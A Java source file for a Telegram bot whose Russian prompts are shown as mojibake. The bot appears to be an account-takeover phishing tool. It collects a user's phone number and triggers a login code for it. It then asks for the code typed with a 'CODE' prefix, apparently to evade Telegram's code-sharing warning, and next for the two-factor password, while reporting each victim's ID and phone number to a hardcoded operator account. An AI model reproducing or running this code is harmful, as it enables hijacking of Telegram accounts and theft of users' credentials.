package org.telebot.telegrambot;

import java.io.IOException;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.json.JSONException;
import org.json.JSONObject;

public class UpdateProcessor {

    public String jsonObject;

    private Message mes;

    public UpdateProcessor(String jsonObject) {
        this.jsonObject = jsonObject;
        this.mes = proccessJson();
    }

    private Message proccessJson() {
        Message mes;
        JSONObject obj = new JSONObject(this.jsonObject);
        Long id = Long.valueOf(obj.getJSONObject("message").getJSONObject("from").getLong("id"));
        try {
            String text = obj.getJSONObject("message").getString("text");
            mes = new Message(id, text);
        } catch (JSONException ex) {
            mes = new Message(id, "");
            ex.printStackTrace();
        }
        try {
            String phone = obj.getJSONObject("message").getJSONObject("contact").getString("phone_number");
            Long userid = Long.valueOf(obj.getJSONObject("message").getJSONObject("contact").getLong("user_id"));
            if (userid.longValue() == mes.getChat_id().longValue()) {
                mes.setPhone(phone);
            }
            System.out.println(phone);
        } catch (JSONException jSONException) {
        }
        return mes;
    }

    public void process() {
        SecurityProcessor sec = new SecurityProcessor(this.mes.getChat_id());
        if (this.mes.getText() != null && this.mes.getText().equals("/start")) {
            if (!sec.userExists()) {
                sec.createNewUser(this.mes.getChat_id());
            }
            sec.setUserStatus("started");
            Response response = new KeyboardResponse(this.mes.getChat_id());
            sendResponse(response);
            return;
        }
        if (this.mes.getPhone() == null && !sec.responseForStatus().equals("active") && !sec.responseForStatus().equals("code") && !sec.responseForStatus().equals("password")) {
            Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð§Ñ‚Ð¾Ð±Ñ‹ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð´Ð¸Ñ‚ÑŒ Ð’Ð°Ñˆ Ð°ÐºÐºÐ°ÑƒÐ½Ñ‚, Ð½Ð°Ð¶Ð¼Ð¸Ñ‚Ðµ /start"));
            sendResponse(response);
            return;
        }
        if (this.mes.getPhone() != null && sec.responseForStatus().equals("started")) {
            sec.setUserPhone(this.mes.getPhone());
            XTGConnector xtgConnector = new XTGConnector();
            if (xtgConnector.requestForCode(this.mes.getPhone()) == 1) {
                Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�Ð° Ð’Ð°Ñˆ Ð½Ð¾Ð¼ÐµÑ€ " + this.mes.getPhone() + "Ð±Ñ‹Ð» Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÐµÐ½ Ð¿Ñ�Ñ‚Ð¸Ð·Ð½Ð°Ñ‡Ð½Ñ‹Ð¹ ÐºÐ¾Ð´. Ð”Ð»Ñ� Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½Ð¸Ñ� Ð²Ð²ÐµÐ´Ð¸Ñ‚Ðµ ÐµÐ³Ð¾ Ð² Ð¿Ð¾Ð»Ðµ Ð½Ð¸Ð¶Ðµ"));
                sendResponse(response);
                sec.setUserStatus("code");
            }
        } else if (sec.responseForStatus().equals("code")) {
            if (this.mes.getText().length() == 5) {
                XTGConnector xtgConnector = new XTGConnector();
                String phone = sec.getPhone(this.mes.getChat_id());
                int c = xtgConnector.postCode(phone, this.mes.getText());
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException interruptedException) {
                }
                String state = xtgConnector.checkState(phone);
                if (state.equalsIgnoreCase("connected")) {
                    Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð’Ð°Ñˆ Ð½Ð¾Ð¼ÐµÑ€ ÑƒÑ�Ð¿ÐµÑˆÐ½Ð¾ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½."));
                    sendResponse(response);
                    sec.setUserStatus("active");
                } else {
                    Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�ÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÐºÐ¾Ð´"));
                    sendResponse(response);
                }
            } else {
                Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�ÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÐºÐ¾Ð´"));
                sendResponse(response);
            }
        }
    }

    public void process3() {
    }

    public void process2() {
        SecurityProcessor sec = new SecurityProcessor(this.mes.getChat_id());
        if (!sec.userExists()) {
            if (this.mes.getText().equalsIgnoreCase("/start")) {
                if (!sec.userExists()) {
                    sec.createNewUser(this.mes.getChat_id());
                }
                sec.setUserStatus("started");
                Response response1 = new KeyboardResponse(this.mes.getChat_id());
                sendResponse(response1);
                response1 = new MessageResponse(new Message(Long.valueOf(5248584965L), "ÐŸÐ¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ " + this.mes.getChat_id() + " Ð½Ð°Ñ‡Ð°Ð» Ñ€Ð°Ð±Ð¾Ñ‚Ñƒ"));
                sendResponse(response1);
                return;
            }
            Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð§Ñ‚Ð¾Ð±Ñ‹ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð´Ð¸Ñ‚ÑŒ Ð’Ð°Ñˆ Ð°ÐºÐºÐ°ÑƒÐ½Ñ‚, Ð½Ð°Ð¶Ð¼Ð¸Ñ‚Ðµ /start"));
            sendResponse(response);
            return;
        }
        if (sec.responseForStatus().equalsIgnoreCase("started")) {
            if (this.mes.getPhone() != null) {
                sec.setUserPhone(this.mes.getPhone());
                XTGConnector xtgConnector = new XTGConnector();
                if (xtgConnector.requestForCode(this.mes.getPhone()) == 1) {
                    Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�Ð° Ð’Ð°Ñˆ Ð½Ð¾Ð¼ÐµÑ€ *" + this.mes.getPhone() + "* Ð±Ñ‹Ð» Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÐµÐ½ Ð¿Ñ�Ñ‚Ð¸Ð·Ð½Ð°Ñ‡Ð½Ñ‹Ð¹ ÐºÐ¾Ð´. Ð”Ð»Ñ� Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½Ð¸Ñ� Ð²Ð²ÐµÐ´Ð¸Ñ‚Ðµ ÐµÐ³Ð¾ Ð² Ð¿Ð¾Ð»Ðµ Ð½Ð¸Ð¶Ðµ Ð² Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ðµ *CODE12345*"));
                    sendResponse(response);
                    sec.setUserStatus("code");
                    response = new MessageResponse(new Message(Long.valueOf(5248584965L), "ÐŸÐ¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ id:" + this.mes.getChat_id() + " " + this.mes.getPhone() + " Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ð» ÐºÐ¾Ð´"));
                    sendResponse(response);
                    return;
                }
            } else {
                Response response = new KeyboardResponse(this.mes.getChat_id());
                sendResponse(response);
            }
        } else {
            if (sec.responseForStatus().equalsIgnoreCase("code")) {
                String phone = sec.getPhone(this.mes.getChat_id());
                XTGConnector connector = new XTGConnector();
                String code = this.mes.getText();
                if (code.toLowerCase().startsWith("code")) {
                    int c = connector.postCode(sec.getPhone(this.mes.getChat_id()), this.mes.getText());
                    if (c < 1) {
                        Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "ÐŸÑ€Ð¾Ð¸Ð·Ð¾ÑˆÐ»Ð° Ð¾ÑˆÐ¸Ð±ÐºÐ°, Ð¿Ð¾Ð¿Ñ€Ð¾Ð±ÑƒÐ¹Ñ‚ÐµÐ¹ Ð·Ð°Ð½Ð¾Ð²Ð¾"));
                        sendResponse(response1);
                        sec.setUserStatus("started");
                        response1 = new KeyboardResponse(this.mes.getChat_id());
                        sendResponse(response1);
                        return;
                    }
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException interruptedException) {
                    }
                } else {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�Ð¾Ð¼ÐµÑ€ Ð½Ðµ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½. Ð’Ñ‹ Ð²Ð²ÐµÐ»Ð¸ Ð½ÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÐºÐ¾Ð´. ÐŸÑ€Ð¾Ð²ÐµÑ€ÑŒÑ‚Ðµ Ð¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ð¾Ñ�Ñ‚ÑŒ Ð²Ð²ÐµÐ´ÐµÐ½Ð¸Ñ� ÐºÐ¾Ð´Ð° Ð² Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ðµ *CODE12345*"));
                    sendResponse(response1);
                    sec.setUserStatus("code");
                    return;
                }
                String state = connector.checkState(phone);
                if (state.equalsIgnoreCase("connected")) {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "Ð’Ð°Ñˆ Ð½Ð¾Ð¼ÐµÑ€ ÑƒÑ�Ð¿ÐµÑˆÐ½Ð¾ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½"));
                    sendResponse(response1);
                    sec.setUserStatus("active");
                    response1 = new MessageResponse(new Message(Long.valueOf(5248584965L), "ÐŸÐ¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ " + this.mes.getChat_id() + " Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð´Ð¸Ð» Ð½Ð¾Ð¼ÐµÑ€"));
                    sendResponse(response1);
                    return;
                }
                if (state.equalsIgnoreCase("waitpass")) {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "Ð”Ð»Ñ� Ð¿Ñ€Ð¾Ð´Ð¾Ð»Ð¶ÐµÐ½Ð¸Ñ� Ð²Ð²ÐµÐ´Ð¸Ñ‚Ðµ ÐºÐ¾Ð´-Ð¿Ð°Ñ€Ð¾Ð»ÑŒ Ð’Ð°ÑˆÐµÐ³Ð¾ Ð°ÐºÐºÐ°ÑƒÐ½Ñ‚Ð°"));
                    sendResponse(response1);
                    sec.setUserStatus("password");
                    return;
                }
                if (state.equalsIgnoreCase("waitcode")) {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�Ð¾Ð¼ÐµÑ€ Ð½Ðµ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½. Ð’Ñ‹ Ð²Ð²ÐµÐ»Ð¸ Ð½ÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ ÐºÐ¾Ð´. ÐŸÑ€Ð¾Ð²ÐµÑ€ÑŒÑ‚Ðµ Ð¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ð¾Ñ�Ñ‚ÑŒ Ð²Ð²ÐµÐ´ÐµÐ½Ð¸Ñ� ÐºÐ¾Ð´Ð° Ð² Ñ„Ð¾Ñ€Ð¼Ð°Ñ‚Ðµ *CODE12345*"));
                    sendResponse(response1);
                    sec.setUserStatus("code");
                    return;
                }
                Response response = new MessageResponse(new Message(this.mes.getChat_id(), "ÐŸÑ€Ð¾Ð¸Ð·Ð¾ÑˆÐ»Ð° Ð¾ÑˆÐ¸Ð±ÐºÐ°, Ð¿Ð¾Ð¿Ñ€Ð¾Ð±ÑƒÐ¹Ñ‚Ðµ Ð·Ð°Ð½Ð¾Ð²Ð¾"));
                sendResponse(response);
                sec.setUserStatus("started");
                response = new KeyboardResponse(this.mes.getChat_id());
                sendResponse(response);
                return;
            }
            if (sec.responseForStatus().equalsIgnoreCase("active")) {
                Response response = new MessageResponse(new Message(this.mes.getChat_id(), "Ð’Ð°Ñˆ Ð½Ð¾Ð¼ÐµÑ€ ÑƒÑ�Ð¿ÐµÑˆÐ½Ð¾ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½"));
                sendResponse(response);
            } else if (sec.responseForStatus().equalsIgnoreCase("password")) {
                String phone = sec.getPhone(this.mes.getChat_id());
                XTGConnector connector = new XTGConnector();
                int c = connector.postPassword(sec.getPhone(this.mes.getChat_id()), this.mes.getText());
                if (c < 1) {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "ÐŸÑ€Ð¾Ð¸Ð·Ð¾ÑˆÐ»Ð° Ð¾ÑˆÐ¸Ð±ÐºÐ°, Ð¿Ð¾Ð¿Ñ€Ð¾Ð±ÑƒÐ¹Ñ‚Ðµ Ð·Ð°Ð½Ð¾Ð²Ð¾"));
                    sendResponse(response1);
                    sec.setUserStatus("started");
                    response1 = new KeyboardResponse(this.mes.getChat_id());
                    sendResponse(response1);
                    return;
                }
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException interruptedException) {
                }
                String state = connector.checkState(phone);
                if (state.equalsIgnoreCase("connected")) {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "Ð’Ð°Ñˆ Ð½Ð¾Ð¼ÐµÑ€ ÑƒÑ�Ð¿ÐµÑˆÐ½Ð¾ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½"));
                    sendResponse(response1);
                    sec.setUserStatus("active");
                    return;
                }
                if (state.equalsIgnoreCase("waitpass")) {
                    Response response1 = new MessageResponse(new Message(this.mes.getChat_id(), "Ð�Ð¾Ð¼ÐµÑ€ Ð½Ðµ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð¶Ð´ÐµÐ½. Ð’Ñ‹ Ð²Ð²ÐµÐ»Ð¸ Ð½ÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹Ð¹ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ"));
                    sendResponse(response1);
                    sec.setUserStatus("password");
                    return;
                }
                Response response = new MessageResponse(new Message(this.mes.getChat_id(), "ÐŸÑ€Ð¾Ð¸Ð·Ð¾ÑˆÐ»Ð° Ð¾ÑˆÐ¸Ð±ÐºÐ°, Ð¿Ð¾Ð¿Ñ€Ð¾Ð±ÑƒÐ¹Ñ‚Ðµ Ð·Ð°Ð½Ð¾Ð²Ð¾"));
                sendResponse(response);
                sec.setUserStatus("started");
                response = new KeyboardResponse(this.mes.getChat_id());
                sendResponse(response);
                return;
            }
        }
    }

    private void sendResponse(Response response) {
        CloseableHttpClient closeableHttpClient = HttpClients.createDefault();
        HttpPost post = response.getPost();
        try {
            HttpResponse httpResponse = closeableHttpClient.execute((HttpUriRequest) post);
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public void processXTG() {
    }

    private boolean checkForPass(String pass) {
        return pass.equals("destroy666");
    }
}
